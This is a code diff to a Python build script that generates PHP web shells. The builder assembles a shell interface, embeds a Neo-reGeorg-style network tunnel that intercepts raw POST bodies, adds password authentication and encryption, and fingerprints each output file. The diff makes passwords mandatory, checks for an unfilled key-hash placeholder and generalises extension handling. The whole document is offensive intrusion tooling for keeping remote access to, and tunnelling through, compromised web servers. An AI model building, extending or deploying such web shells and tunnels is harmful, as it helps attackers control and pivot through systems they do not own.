@@ -21,8 +21,8 @@ import sys
 
 from .auth import build_auth_block
 from .config import (
-    MODULE_BACKEND, MODULE_JS, get_excluded_files, load_config,
-    load_ordered_files, read_file, strip_module_blocks,
+    MODULE_BACKEND, MODULE_JS, SCRIPT_EXTENSIONS, get_excluded_filepaths,
+    load_config, load_ordered_filepaths, read_file, strip_module_blocks,
 )
 from .fingerprint import generate_build_meta
 from .minify import minify_css, minify_js
@@ -39,11 +39,6 @@ SHELL_TITLE_SVG = (
     '<path d="M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z"/>'
     '</svg> SHELL'
 )
-
-# Language → output extension. The lang argparse choice limits this to
-# 'php' today; the table reserves the names for future expansion.
-SCRIPT_EXTENSIONS = {'php': '.php', 'aspx': '.aspx', 'jsp': '.jsp', 'py': '.py'}
-
 
 # ---------------------------------------------------------------------------
 # Step helpers — each owns one phase of the build pipeline
@@ -77,21 +72,22 @@ def _load_template(lang):
 
 
 def _assemble_backend(lang, excluded_files):
-    """Concatenate backend PHP files in their declared order.
+    """Concatenate backend source files for *lang* in declared order.
 
-    Each source file starts with its own ``<?php`` opener so editors
+    For PHP, each source file starts with its own ``<?php`` opener so editors
     syntax-highlight them, but the template already opens PHP and slots
     {{BACKEND}} inside that block. We strip per-file ``<?php`` and ``?>``
     tags before concatenating, otherwise PHP refuses to parse nested
     open tags in the assembled shell.
     """
+    ext = SCRIPT_EXTENSIONS.get(lang, f'.{lang}')
     parts = []
-    for fpath in load_ordered_files(BACKEND_DIR(lang), '.php'):
+    for fpath in load_ordered_filepaths(BACKEND_DIR(lang), ext):
         if os.path.basename(fpath) in excluded_files:
             continue
         content = read_file(fpath)
-        content = re.sub(r'^\s*<\?php\s*\n?', '', content)
-        content = re.sub(r'\s*\?>\s*$', '', content)
+        content = re.sub(r'^<\?php\s*', '', content)
+        content = re.sub(r'\?>\s*$', '', content.strip())
         parts.append(content)
     return '\n'.join(parts)
 
@@ -114,8 +110,14 @@ def _build_tunnel_block(tunnel_path_arg, exclude):
         sys.exit(1)
 
     code = read_file(tunnel_path).strip()
+    
+    # if target lang is php (safe on non-php)
     code = re.sub(r'^<\?php\s*', '', code)
     code = re.sub(r'\?>\s*$', '', code.strip())
+
+    if '{{KEY_HASH}}' in code:
+        print('[!] Tunnel file still contains {{KEY_HASH}} — run webtun.py --generate first')
+        sys.exit(1)
 
     # POST without form 'action' is a Neo-reGeorg/WebTun tunnel command
     # (raw binary body) — must be intercepted before the shell UI renders.
@@ -126,11 +128,12 @@ def _build_tunnel_block(tunnel_path_arg, exclude):
         "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) "
         "&& !isset($_POST['__auth_pass']) && !isset($_POST['__enc'])) {\n"
         "ob_end_clean();\n"
+        "if (isset($__AUTH_HASH)) { session_start(); }\n"
         + code + "\n"
         "exit;\n"
         "}\n"
     )
-    print(f"[*] Neo-reGeorg tunnel embedded from: {tunnel_path}")
+    print(f"[*] Tunnel embedded from: {tunnel_path}")
     return block
 
 
@@ -175,7 +178,7 @@ def _resolve_palette(args):
 def _assemble_js(excluded_js):
     """Concatenate frontend JS in declared order (skipping excluded modules)."""
     parts = []
-    for fpath in load_ordered_files(JS_DIR, '.js'):
+    for fpath in load_ordered_filepaths(JS_DIR, '.js'):
         if os.path.basename(fpath) in excluded_js:
             continue
         parts.append(read_file(fpath))
@@ -215,7 +218,7 @@ def _inject_build_meta(content, meta):
 def _determine_output_path(args, meta, lang):
     """Resolve the dist/ output path. Operator's --output wins; otherwise
     we fall back to ``shell_<short_id>.<ext>``."""
-    ext = SCRIPT_EXTENSIONS.get(lang, '.php')
+    ext = SCRIPT_EXTENSIONS.get(lang, f'.{lang}')
     if args.output:
         name = args.output if args.output.endswith(ext) else args.output + ext
     else:
@@ -234,8 +237,8 @@ def _print_summary(args, meta, out_path, theme_name, exclude, lang):
     print(f"    SHA256:    {meta['hash']}")
     print(f"    Size:      {file_size:,} bytes")
     print(f"    Excluded:  {excluded_str}")
-    print(f"    Auth:      {'yes' if args.password else 'no'}")
-    print(f"    Encrypted: {'yes' if args.password else 'no'}")
+    print(f"    Auth:      yes")
+    print(f"    Encrypted: yes")
     print(f"    Tunnel:    {'embedded' if args.tunnel else 'not embedded'}")
     print(f"    Minified:  {'yes' if args.minify else 'no'}")
     print(f"    Theme:     {theme_name}")
@@ -249,28 +252,33 @@ def _print_summary(args, meta, out_path, theme_name, exclude, lang):
 
 def build(args):
     """Top-level build orchestration. Returns the output file path."""
+    password = (args.password or '').strip()
+    if not password:
+        print('[!] --password is required (open builds are disabled)')
+        sys.exit(1)
+
     config = load_config()
     lang = args.lang
     version = config.get('version', '1.0.0')
 
     # Configuration
     exclude = _validate_exclude(args.exclude, config)
-    excluded_backend, excluded_js = get_excluded_files(exclude)
+    excluded_backend_filepaths, excluded_js_filepaths = get_excluded_filepaths(exclude)
     template = _load_template(lang)
 
     # Assemble parts
-    backend = _assemble_backend(lang, excluded_backend)
+    backend = _assemble_backend(lang, excluded_backend_filepaths)
     tunnel_block = _build_tunnel_block(args.tunnel, exclude)
     palette, theme_name = _resolve_palette(args)
     custom_css = generate_custom_css(palette)
-    auth_block = build_auth_block(args.password, palette) if args.password else ''
-    if args.password:
-        print(f"[*] Auth enabled — password hash: SHA256({args.password[:2]}...)")
+    auth_block = build_auth_block(lang, password, palette)
+    print(f"[*] Auth enabled — password hash: SHA256({password[:2]}...)")
 
     css = read_file(CSS_PATH)
-    js = _assemble_js(excluded_js)
+    js = _assemble_js(excluded_js_filepaths)
     html = _assemble_html(exclude)
 
+    # Simple custom implementation, TODO enhance
     if args.minify:
         css = minify_css(css)
         js = minify_js(js)
@@ -291,8 +299,7 @@ def build(args):
 
     # Fingerprint the assembled content, then second-pass inject the meta.
     meta = generate_build_meta(pre_output, args.seed, lang, version)
-    if args.password:
-        meta['encrypted'] = True
+    meta['encrypted'] = True
     output = _inject_build_meta(pre_output, meta)
 
     # Write
